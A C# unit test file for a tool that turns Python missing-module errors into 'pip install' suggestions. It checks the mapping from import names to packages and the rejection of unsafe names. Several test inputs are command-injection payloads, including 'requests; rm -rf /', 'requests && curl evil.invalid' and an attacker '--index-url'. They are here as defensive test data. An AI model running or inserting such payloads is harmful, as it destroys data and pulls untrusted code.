using FixFinder.Core.Execution;
using FixFinder.Core.Parsing;
using FixFinder.Core.Sources;

namespace FixFinder.Tests;

/// <summary>Reading a missing package out of a crash, and refusing to build a command out of anything else.</summary>
public class MissingModuleTests
{
    private static readonly string? Python =
        TargetFactory.FindOnPath("python") ??
        TargetFactory.FindOnPath("py") ??
        TargetFactory.FindOnPath("python3");

    private static ParsedError Error(string message, string type = "ModuleNotFoundError", ErrorFrame[]? frames = null) => new()
    {
        LanguageId = "python",
        Confidence = 90,
        RawText = $"{type}: {message}",
        FirstLineSequence = 0,
        ExceptionType = type,
        Message = message,
        Frames = frames ?? [],
    };

    private static TargetSpec Spec(string? executable = null) => new()
    {
        ExecutablePath = executable ?? Python ?? @"C:\Python313\python.exe",
        Arguments = "app.py",
        WorkingDirectory = @"C:\work",
    };

    [Theory]
    [InlineData("No module named 'requests'", "requests", "requests")]
    [InlineData("No module named 'yaml'", "yaml", "pyyaml")]
    [InlineData("No module named 'cv2'", "cv2", "opencv-python")]
    [InlineData("No module named 'PIL'", "PIL", "pillow")]
    [InlineData("No module named 'sklearn'", "sklearn", "scikit-learn")]
    [InlineData("No module named 'google.protobuf'", "google.protobuf", "protobuf")]
    [InlineData("No module named 'google.cloud.storage'", "google.cloud.storage", "google-cloud-storage")]
    [InlineData("No module named 'googleapiclient'", "googleapiclient", "google-api-python-client")]
    public void TheImportNameIsMappedToThePackageThatProvidesIt(
        string message, string module, string package)
    {
        var missing = MissingModule.Read(Error(message));

        Assert.NotNull(missing);
        Assert.Equal(module, missing!.Module);
        Assert.Equal(package, missing.Package);
    }

    /// <summary>
    /// Google's packages share the one `google` name, so a module under it that is not known is given no package at all:
    /// protobuf, which the bare name used to be taken for, provides neither google.colab nor anything but google.protobuf.
    /// </summary>
    [Theory]
    [InlineData("No module named 'google.colab'")]
    [InlineData("No module named 'google'")]
    [InlineData("No module named 'google.some_new_service'")]
    public void AModuleUnderGoogleThatIsNotKnownIsGivenNoPackageToInstall(string message)
    {
        Assert.Null(MissingModule.Read(Error(message)));
        Assert.Null(MissingModule.For(Error(message), Spec()));
    }

    [Theory]
    [InlineData("No module named 'google.colab'", true)]
    [InlineData("No module named 'google.colab.drive'", true)]
    [InlineData("No module named 'google.protobuf'", false)]
    [InlineData("No module named 'colab'", false)]
    public void GoogleColabsOwnModuleIsToldApart(string message, bool colabOnly) =>
        Assert.Equal(colabOnly, MissingModule.IsColabOnly(Error(message)));

    [Theory]
    [InlineData("from google.colab import drive", true)]
    [InlineData("import google.colab", true)]
    [InlineData("from google.cloud import storage", false)]
    public void WhereNothingProvidesGoogleTheLineThatStoppedSaysWhetherItWasColabs(string importing, bool colabOnly)
    {
        // With no package of Google's installed, Python names only google as missing, whichever module under it was imported.
        using var temp = new TempFolder();
        var program = Path.Combine(temp.Path, "analysis.py");
        File.WriteAllText(program, $"import os\n{importing}\n");
        var stopped = new ErrorFrame { Order = 0, Symbol = "<module>", File = program, Line = 2, RawLine = "" };

        Assert.Equal(colabOnly, MissingModule.IsColabOnly(Error("No module named 'google'", frames: [stopped])));
    }

    [Fact]
    public void ASubmoduleResolvesToItsTopLevelPackage()
    {
        var missing = MissingModule.Read(Error("No module named 'yaml.loader'"));

        Assert.Equal("yaml.loader", missing!.Module);
        Assert.Equal("pyyaml", missing.Package);
    }

    [Fact]
    public void AnErrorThatIsNotAboutAMissingModuleIsIgnored()
    {
        Assert.Null(MissingModule.Read(Error("'b'", "KeyError")));
        Assert.Null(MissingModule.Read(Error("division by zero", "ZeroDivisionError")));
    }

    [Theory]
    [InlineData("--index-url=http://evil.invalid/simple")]
    [InlineData("-e")]
    [InlineData("requests; rm -rf /")]
    [InlineData("requests && curl evil.invalid")]
    [InlineData("../../../etc/passwd")]
    [InlineData("http://evil.invalid/pkg.tar.gz")]
    [InlineData("C:\\Windows\\System32")]
    [InlineData("requests --target C:\\Windows")]
    [InlineData("")]
    public void AModuleNameThatIsNotAnIdentifierIsRefused(string name)
    {
        Assert.Null(MissingModule.Read(Error($"No module named '{name}'")));
    }

    [Theory]
    [InlineData("--index-url=http://evil.invalid/simple")]
    [InlineData("requests; rm -rf /")]
    public void NoCommandIsBuiltFromARefusedName(string name)
    {
        Assert.Null(MissingModule.For(Error($"No module named '{name}'"), Spec()));
    }

    [Fact]
    public void TheCommandUsesTheInterpreterThatActuallyRan()
    {
        var candidate = MissingModule.For(
            Error("No module named 'yaml'"), Spec(@"C:\Python313\python.exe"));

        Assert.NotNull(candidate);
        Assert.Equal(FixTier.Dependency, candidate!.Tier);
        Assert.Equal(@"""C:\Python313\python.exe"" -m pip install pyyaml", candidate.Command);
    }

    [Theory]
    [InlineData(@"C:\Program Files\Microsoft\jdk-21\bin\java.exe")]
    [InlineData(@"C:\Program Files\nodejs\node.exe")]
    [InlineData(@"C:\out\a.exe")]
    public void NothingIsOfferedWhenPythonDidNotRunIt(string executable)
    {
        Assert.Null(MissingModule.For(Error("No module named 'yaml'"), Spec(executable)));
    }

    [Fact]
    public void NothingIsOfferedWithNoTargetAtAll()
    {
        Assert.Null(MissingModule.For(Error("No module named 'yaml'"), null));
    }

    [Fact]
    public void AMismatchedPackageNameIsExplainedInTheBody()
    {
        var candidate = MissingModule.For(Error("No module named 'yaml'"), Spec());

        Assert.Contains("imported as `yaml`", candidate!.BodyText, StringComparison.Ordinal);
        Assert.Contains("published as `pyyaml`", candidate.BodyText, StringComparison.Ordinal);
    }

    [Fact]
    public void AMatchingNameIsNotExplainedAtLength()
    {
        var candidate = MissingModule.For(Error("No module named 'requests'"), Spec());

        Assert.DoesNotContain("published as", candidate!.BodyText, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ARealMissingImportProducesTheRightCommand()
    {
        if (Python is null) return;

        using var temp = new TempFolder();

        var script = Path.Combine(temp.Path, "needs.py");
        File.WriteAllText(script, "import yaml\nprint(yaml)\n");

        var spec = new TargetSpec
        {
            ExecutablePath = Python,
            Arguments = $"\"{script}\"",
            WorkingDirectory = temp.Path,
            Timeout = TimeSpan.FromSeconds(30),
        };

        var run = await new TargetRunner(new ParserRegistry()).RunAsync(spec, CancellationToken.None);

        Assert.NotNull(run.Error);

        var candidate = MissingModule.For(run.Error!, spec);

        Assert.NotNull(candidate);
        Assert.EndsWith("-m pip install pyyaml", candidate!.Command!, StringComparison.Ordinal);
        Assert.Contains(Python, candidate.Command!, StringComparison.OrdinalIgnoreCase);
    }
}
